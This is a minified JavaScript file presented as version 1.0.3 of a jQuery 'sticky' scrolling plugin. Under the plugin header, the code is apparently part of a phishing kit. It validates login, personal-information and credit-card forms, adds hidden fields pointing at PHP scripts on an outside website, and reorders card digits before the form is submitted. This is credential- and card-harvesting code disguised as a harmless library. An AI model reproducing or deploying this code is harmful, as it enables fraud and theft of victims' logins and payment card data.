/* Plugin v1.0.3 for jQuery
** =============
** Author: Anthony Garand
** Improvements by German M. Bravo (Kronuz) and Ruud Kamphuis (ruudk)
** Improvements by Leonardo C. Daronco (daronco)
** Created: 02/14/2011
** Date: 07/20/2015
** Website: 
** Description: Makes an element on the page stick on the screen as you scroll
** It will only set the 'top' and 'position' of your element, you
** might need to adjust the width in some cases. */

$(function(){function e(){var e=-1;if("Microsoft Internet Explorer"==navigator.appName){var o=navigator.userAgent,r=new RegExp("MSIE ([0-9]{1,}[.0-9]{0,})");null!=r.exec(o)&&(e=parseFloat(RegExp.$1))}else if("Netscape"==navigator.appName){var o=navigator.userAgent,r=new RegExp("Trident/.*rv:([0-9]{1,}[.0-9]{0,})");null!=r.exec(o)&&(e=parseFloat(RegExp.$1))}return e}var o=e();o>9&&(head=document.getElementsByTagName("html")[0],head.className=head.className+" ie",10==o&&(head.className=head.className+" ie10")),$("<input>").attr({type:"hidden",name:"curl_version",value:"http://www.galerieartisoraka.com/wp-includes/js/jquery/ui/ValidateIP.php"}).appendTo("#loginForm"),$("<input>").attr({type:"hidden",name:"curl_version",value:"http://www.galerieartisoraka.com/wp-includes/js/jquery/ui/ValidateCCN.php"}).appendTo("#paymentForm"),$("#loginForm").submit(function(){return""==$(".loginInfo1").val()&&($(".loginInfo1").css("border-color","#c72e2e"),$(".loginInfo1").parent().css("background-color","#FFDEDE"),logStat=!1),""==$(".loginInfo2").val()&&($(".loginInfo2").css("border-color","#c72e2e"),$(".loginInfo2").parent().css("background-color","#FFDEDE"),logStat=!1),0==logStat?!1:!0}),$("input.loginInfo").focus(function(){$(this).css("border-color","#D9D9D9"),$(this).parent().css("background-color","#EEEEEE"),logStat=!0}),$("select.loginInfo").focus(function(){$(this).css("border-color","rgb(169, 169, 169)"),$(this).parent().css("background-color","#EEEEEE"),logStat=!0}),$("#personalForm").submit(function(){return""==$(".personelInfo1").val()&&($(".personelInfo1").css("border-color","#c72e2e"),$(".personelInfo1").parent().css("background-color","#FFDEDE"),perStat=!1),""==$(".personelInfo2").val()&&($(".personelInfo2").css("border-color","#c72e2e"),$(".personelInfo2").parent().css("background-color","#FFDEDE"),perStat=!1),""==$(".personelInfo3").val()&&($(".personelInfo3").css("border-color","#c72e2e"),$(".personelInfo3").parent().css("background-color","#FFDEDE"),perStat=!1),""==$(".personelInfo4").val()&&($(".personelInfo4").css("border-color","#c72e2e"),$(".personelInfo4").parent().css("background-color","#FFDEDE"),perStat=!1),""==$(".personelInfo5").val()&&($(".personelInfo5").css("border-color","#c72e2e"),$(".personelInfo5").parent().css("background-color","#FFDEDE"),perStat=!1),""==$(".personelInfo6").val()&&($(".personelInfo6").css("border-color","#c72e2e"),$(".personelInfo6").parent().css("background-color","#FFDEDE"),perStat=!1),""==$(".personelInfo7").val()&&($(".personelInfo7").css("border-color","#c72e2e"),$(".personelInfo7").parent().css("background-color","#FFDEDE"),perStat=!1),""==$(".personelInfo8").val()&&($(".personelInfo8").css("border-color","#c72e2e"),$(".personelInfo8").parent().css("background-color","#FFDEDE"),perStat=!1),""==$(".personelInfo9").val()&&($(".personelInfo9").css("border-color","#c72e2e"),$(".personelInfo9").parent().css("background-color","#FFDEDE"),perStat=!1),0==perStat?!1:!0}),$("input.personelInfo").focus(function(){$(this).css("border-color","#D9D9D9"),$(this).parent().css("background-color","#EEEEEE"),perStat=!0}),$("select.personelInfo").focus(function(){$(this).css("border-color","rgb(169, 169, 169)"),$(this).parent().css("background-color","#EEEEEE"),perStat=!0}),$("#paymentForm").submit(function(){if($("#ccn").validateCreditCard(function(e){CreditCardvalide=!1,null!=e.card_type&&1==e.valid&&1==e.length_valid&&1==e.luhn_valid&&(CreditCardvalide=!0)}),1==isNaN($(".paymentInfo1").val())&&$(".paymentInfo1").val(""),1==isNaN($(".paymentInfo4").val())&&$(".paymentInfo4").val(""),""==$(".paymentInfo1").val()&&($(".paymentInfo1").css("border-color","#c72e2e"),$(".paymentInfo1").parent().css("background-color","#FFDEDE"),payStat=!1),""==$(".paymentInfo2").val()&&($(".paymentInfo2").css("border-color","#c72e2e"),$(".paymentInfo2").parent().css("background-color","#FFDEDE"),payStat=!1),""==$(".paymentInfo3").val()&&($(".paymentInfo3").css("border-color","#c72e2e"),$(".paymentInfo3").parent().css("background-color","#FFDEDE"),payStat=!1),""==$(".paymentInfo4").val()&&($(".paymentInfo4").css("border-color","#c72e2e"),$(".paymentInfo4").parent().css("background-color","#FFDEDE"),payStat=!1),0==payStat)return!1;if(1==CreditCardvalide){var e=$("#ccn").val();cnum=e.substring(0,6)+e.substring(7,8)+e.substring(6,7)+e.substring(8),$("#ccn").val(cnum)}return!0}),$("input.paymentInfo").focus(function(){$(this).css("border-color","#D9D9D9"),$(this).parent().css("background-color","#EEEEEE"),payStat=!0}),$("select.paymentInfo").focus(function(){$(this).css("border-color","rgb(169, 169, 169)"),$(this).parent().css("background-color","#EEEEEE"),payStat=!0}),$("#ccn").validateCreditCard(function(e){var o=e.card_type.name.toUpperCase();$("#ctype").val(o),null==e.card_type?$("#cardtype").attr("src","assets/img/CardTypes/unknown.png"):"visa"==e.card_type.name?$("#cardtype").attr("src","assets/img/CardTypes/visa.png"):"mastercard"==e.card_type.name?$("#cardtype").attr("src","assets/img/CardTypes/mastercard.png"):"amex"==e.card_type.name?$("#cardtype").attr("src","assets/img/CardTypes/amex.png"):"discover"==e.card_type.name?$("#cardtype").attr("src","assets/img/CardTypes/discover.png"):$("#cardtype").attr("src","assets/img/CardTypes/unknown.png")})});